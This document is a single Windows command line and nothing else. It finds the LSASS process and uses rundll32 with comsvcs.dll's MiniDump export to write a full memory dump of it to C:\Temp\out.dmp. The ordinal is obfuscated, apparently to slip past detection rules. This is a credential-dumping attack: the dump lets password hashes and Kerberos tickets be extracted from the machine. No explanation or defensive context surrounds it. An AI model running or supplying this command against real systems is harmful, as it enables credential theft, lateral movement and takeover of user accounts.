for /f "tokens=2" %B in ('tasklist /fi "Imagename eq lsass.exe"') do rundll32.exe C:\Windows\System32\comsvcs.dll, #+0000^24 %B C:\Temp\out.dmp full
